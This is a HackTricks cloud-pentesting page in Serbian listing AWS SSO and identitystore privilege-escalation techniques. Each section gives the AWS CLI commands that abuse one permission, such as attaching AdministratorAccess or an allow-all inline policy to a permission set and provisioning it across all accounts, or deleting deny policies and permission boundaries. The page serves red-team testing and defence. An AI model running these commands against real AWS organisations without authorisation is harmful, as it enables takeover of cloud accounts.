# AWS - SSO & identitystore Privesc

{% hint style="success" %}
Naučite i vežbajte hakovanje AWS-a: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Naučite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## AWS Centar identiteta / AWS SSO

Za više informacija o AWS Centru identiteta / AWS SSO proverite:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Imajte na umu da **podrazumevano**, samo **korisnici** sa dozvolama **iz** **Upravljačkog naloga** će moći da pristupe i **kontrolišu IAM Centar identiteta**.\
Korisnici iz drugih naloga to mogu dozvoliti samo ako je nalog **Delegirani administrator.**\
[Pogledajte dokumentaciju za više informacija.](https://docs.aws.amazon.com/singlesignon/latest/userguide/delegated-admin.html)
{% endhint %}

### ~~Resetovanje lozinke~~

Jedan jednostavan način za eskalaciju privilegija u slučajevima poput ovog bio bi da imate dozvolu koja omogućava resetovanje korisničkih lozinki. Nažalost, jedino je moguće poslati email korisniku da resetuje svoju lozinku, tako da biste trebali imati pristup korisnikovom emailu.

### `identitystore:CreateGroupMembership`

Sa ovom dozvolom je moguće postaviti korisnika unutar grupe tako da će naslediti sve dozvole koje grupa ima.

{% code overflow="wrap" %}
```bash
aws identitystore create-group-membership --identity-store-id <tore-id> --group-id <group-id> --member-id UserId=<user-id>
```
{% endcode %}

### `sso:PutInlinePolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Napadač sa ovlašćenjem može dodati dodatna ovlašćenja Permission Set-u koji je dodeljen korisniku pod njegovom kontrolom

{% code overflow="wrap" %}
```bash
# Set an inline policy with admin privileges
aws sso-admin put-inline-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --inline-policy file:///tmp/policy.yaml

# Content of /tmp/policy.yaml
{
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Statement1",
"Effect": "Allow",
"Action": ["*"],
"Resource": ["*"]
}
]
}

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachManagedPolicyToPermissionSet`, `sso:ProvisionPermissionSet`

Napadač sa ovlašćenjem može dodati dodatna ovlašćenja Permission Set-u koji je dodeljen korisniku pod njegovom kontrolom

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-managed-policy-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --managed-policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
### `sso:AttachCustomerManagedPolicyReferenceToPermissionSet`, `sso:ProvisionPermissionSet`

Napadač sa ovlašćenjem može dodati dodatna ovlašćenja Permission Set-u koji je dodeljen korisniku pod njegovom kontrolom.

{% hint style="warning" %}
Da biste zloupotrebili ova ovlašćenja u ovom slučaju, morate znati **ime politike koja se upravlja od strane korisnika koja se nalazi U SVIM nalogama** koje će biti pogođene.
{% endhint %}

{% code overflow="wrap" %}
```bash
# Set AdministratorAccess policy to the permission set
aws sso-admin attach-customer-managed-policy-reference-to-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --customer-managed-policy-reference <customer-managed-policy-name>

# Update the provisioning so the new policy is created in the account
aws sso-admin provision-permission-set --instance-arn <instance-arn> --permission-set-arn <perm-set-arn> --target-type ALL_PROVISIONED_ACCOUNTS
```
{% endcode %}

### `sso:CreateAccountAssignment`

Napadač sa ovlašćenjem može dodeliti Set dozvola korisniku pod svojom kontrolom na nalogu. 

{% code overflow="wrap" %}
```bash
aws sso-admin create-account-assignment --instance-arn <instance-arn> --target-id <account_num> --target-type AWS_ACCOUNT --permission-set-arn <permission_set_arn> --principal-type USER --principal-id <principal_id>
```
{% endcode %}

### `sso:GetRoleCredentials`

Vraća STS kratkoročne akreditive za dato ime uloge koje je dodeljeno korisniku.

{% code overflow="wrap" %}
```
aws sso get-role-credentials --role-name <value> --account-id <value> --access-token <value>
```
{% endcode %}

Međutim, potreban vam je pristupni token za koji nisam siguran kako ga dobiti (TODO).

### `sso:DetachManagedPolicyFromPermissionSet`

Napadač sa ovom dozvolom može ukloniti asocijaciju između AWS upravljane politike iz određenog skupa dozvola. Moguće je dodijeliti više privilegija putem **odvajanja upravljane politike (politika zabrane)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-managed-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN> --managed-policy-arn <ManagedPolicyARN>
```
{% endcode %}

### `sso:DetachCustomerManagedPolicyReferenceFromPermissionSet`

Napadač sa ovom dozvolom može ukloniti asocijaciju između Customer managed policy sa određenim permission set-om. Moguće je dodijeliti više privilegija putem **odvajanja managed policy (deny policy)**.

{% code overflow="wrap" %}
```bash
aws sso-admin detach-customer-managed-policy-reference-from-permission-set --instance-arn <value> --permission-set-arn <value> --customer-managed-policy-reference <value>
```
{% endcode %}

### `sso:DeleteInlinePolicyFromPermissionSet`

Napadač sa ovom dozvolom može ukloniti dozvole iz ugrađene politike iz skupa dozvola. Moguće je dodijeliti **više privilegija putem odvajanja ugrađene politike (politika zabrane)**.

{% code overflow="wrap" %}
```bash
aws sso-admin delete-inline-policy-from-permission-set --instance-arn <SSOInstanceARN> --permission-set-arn <PermissionSetARN>
```
### `sso:DeletePermissionBoundaryFromPermissionSet`

Napadač sa ovom dozvolom može ukloniti granicu dozvole sa skupa dozvola. Moguće je dodijeliti **više privilegija uklanjanjem ograničenja na skupu dozvola** datih od granice dozvole.

{% code overflow="wrap" %}
```bash
aws sso-admin   delete-permissions-boundary-from-permission-set --instance-arn <value> --permission-set-arn <value>
```
{% endcode %}

{% hint style="success" %}
Učite i vežbajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Učite i vežbajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
